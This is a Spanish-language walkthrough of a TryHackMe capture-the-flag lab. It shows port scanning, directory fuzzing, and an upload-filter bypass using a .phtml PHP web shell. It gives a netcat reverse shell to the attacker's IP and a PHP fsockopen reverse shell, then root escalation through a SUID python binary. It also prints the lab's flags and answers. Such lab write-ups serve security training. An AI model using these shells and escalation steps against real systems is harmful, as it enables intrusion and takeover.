# Test

### `Try Hack Me` `Linux` `RCE` `SUID` `Shell Reversa`

## **FLAGS:**

* User Flag: THM{y0u\_g0t\_a\_sh3ll}
* Root Flag: THM{pr1v1l3g3\_3sc4l4t10n}

## **USERS:**

* test
* rootme

## **BASIC QUESTIONS**

-_**Scan the machine, how many ports are open?**_ --&gt; 2

-_**What version of Apache is running?**_ --&gt; 2.4.29

-_**What service is running on port 22?**_ --&gt; SSH

-_**What is the hidden directory?**_ --&gt; /panel/





## **PASOS**

1. Vemos si el host esta levantado y saber el SSOO \(**Linux**: TTL &lt;= 64\) `ping -c1 IP`

   ![](https://i.imgur.com/JWjpW0H.png)

2. Escaneamos los puertos abiertos
   * Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

     ```text
       -p-        Todos los puertos
       --open     Mostrar solos puertos abiertos
       -T5        Modo más agresivo
       -v         Modo verbose (reporta por pantalla)
       -n        No aplicar resolución DNS
     ```

```text
    ![](https://i.imgur.com/X4QOF0B.png)

- Como va lento, lanzamos este otro comando:
<code>nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP</code>

        -sS        Realizar un TCP SYN port scan
        --min-rate    Emitir al menos 5000 paquetes por segundo
        -Pn        No realizar Host Discovery

 - Va más rápido y encuentra los puertos 22 (SSH) y 80 (HTTP)

    ![](https://i.imgur.com/Kaxg51I.png)
```

1. Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80 IP`

   ![](https://i.imgur.com/n3keyJE.png)

2. Nos centramos en el servidor web Apache. Lanzamos un whatweb para ver si usa algún CMS tipo Wordpress, pero vemos que no, es un Apache normal

   ![](https://i.imgur.com/Q9KECLe.png)

3. Accedemos al portal web y vemos lo mismo con Wappalyzer. El portal no nos dice nada. Vemos el código fuente de la página a ver si encontramos algo. No hay nada
4. Vamos a hacer un fuzzing en el portal para encontrar alguna ruta con un script de enumeración de NMAP

   `nmap -sV --script=http-enum IP`

   ![](https://i.imgur.com/co4HnmM.png)

   * Hacemos el fuzz también con GoBuster, ya que lo pide como pregunta básica `gobuster dir -u IP -w DICT -q -n -e`

     ```text
       -u        Target 
       -w         Diccionario (/usr/share/wordlists/dirb/common.txt)
       -q        Silencioso, no muestra mensajes de estado           
       -n        No muestra códigos de estado        
       -e        Muestra URLs completas
     ```

     ![](https://i.imgur.com/FbBO4Rv.png)

5. Accedemos a los directorios y ficheros que muestra, a ver si hay algo raro. Podemos responder ya a la última pregunta básica.
6. Tenemos un directorio /uploads vacío, donde parece que se suben cosas. En /panel/, parece un portal para subir ficheros:

   ![](https://i.imgur.com/pAToikU.png)

7. Montamos un pequeño script en PHP que ejecute el comando recibido por parámetro:

   ![](https://i.imgur.com/nOPUwub.png)

   * No permite subir PHP

     ![](https://i.imgur.com/aFLHfjf.png)

   * Le cambiamos la extensión a PNG y nos deja subirlo

     ![](https://i.imgur.com/e2COdhz.png)

   * Lo vemos en el panel de uploads

     ![](https://i.imgur.com/HM530rd.png)

   * Pero no podemos abrirlo al no ser una imagen

     ![](https://i.imgur.com/IIPrIEt.png)

   * Probamos en local con diferentes extensiones equivalentes a PHP o otros trucos como NULL BYTE _\(.php3, .php5, .inc, .php.jpg, .php.%00.jpg, .html\)_ pero el navegador no interpreta el PHP, aunque el portal los acepta todos.
   * Probamos con otra equivalente de PHP, .phtml y funciona en local. Lo subimos con un fichero con un "_echo_" y funciona

     ![](https://i.imgur.com/hfjQyOt.png)

8. Subimos el fichero que ejecuta RCE con extensión .phtml. Lo probamos y funciona:

   ![](https://i.imgur.com/EPAj1Ni.png)

## **GET A SHELL**

Vamos a intentar acceder con shell reversa. Usamos este [Cheat-Sheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).

* Levantamos un puerto en escucha en nuestro Kali:

  `nc -lvp 8433`

  ![](https://i.imgur.com/OhyGOCd.png)

* Probamos en nuestro Server local, introduciendo en el parametro cmd lo siguiente. Vemos que funciona

  `nc 10.9.3.8 8443 -e /bin/bash`

  ![](https://i.imgur.com/1JDI3Xm.png)

* Lanzamos lo mismo en el server, pero no funciona. Hay que buscar otro comando.
* Probamos creando la Shell en el propio PHP, en vez de pasarle por parámetro el comando Bash.

  `$sock = fsockopen($ip,$port);`

  `$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);`

  ![](https://i.imgur.com/wmD4cn7.png)

* Subimos al server el mismo script y lo probamos

  ![](https://i.imgur.com/lYabkGv.png)

* Conseguimos una Shell en el servidor como el usuario www-data.
* Podemos configurar una shell interactiva escribiendo lo siguiente por la shell reversa:
  1. script /dev/null -c bash
  2. CTRL + Z
  3. stty raw -echo
  4. fg
  5. reset
  6. xterm
  7. export TERM=xterm
  8. export SHELL=bash
  9. stty -a
  10. stty rows _NumRows_ columns _NumCols_

      _Obtenemos NumRows y NumCols con stty -a en otra terminal con la misma dimensión que la shell reversa_

## **USER FLAG**

Navegamos un poco por la máquina y vemos 2 usuarios en el directorio /home \(test y rootme\). En sus directorios no vemos nada. Intentamos encontrar la flag user.txt con find, which, locate y whereis.

`find / -type f -name user.txt 2> /dev/null`

![](https://i.imgur.com/lYeZDuK.png)

Tenemos la user flag: **THM{y0u\_g0t\_a\_sh3ll}**

## **ROOT FLAG**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4)

1. En primer lugar, intentamos ver los privilegios de sudo del usuario www-data. No puede ejecutar el comando `sudo -l`.
2. Buscamos los ficheros con el SUID activo

   `find / -user root -perm -4000 2>/dev/null`

   ![](https://i.imgur.com/zboRRAe.png)

3. Nos llama la intención **/usr/bin/python**. Intentamos conseguir una shell como root con el siguiente comando, pero no funciona:

   `python -c 'import pty; pty.spawn("/bin/bash")'`

4. No funciona, usamos este otro [tutorial](https://gtfobins.github.io/gtfobins/python/) de GTFOBINS:

   `python -c 'import os; os.execl("/bin/bash", "bash", "-p")'`

   ![](https://i.imgur.com/tdsiKHH.png)

5. Hemos escalado privilegios. Vamos al directorio /root a por la 2a Flag.

   Tenemos la root flag: **THM{pr1v1l3g3\_3sc4l4t10n}**

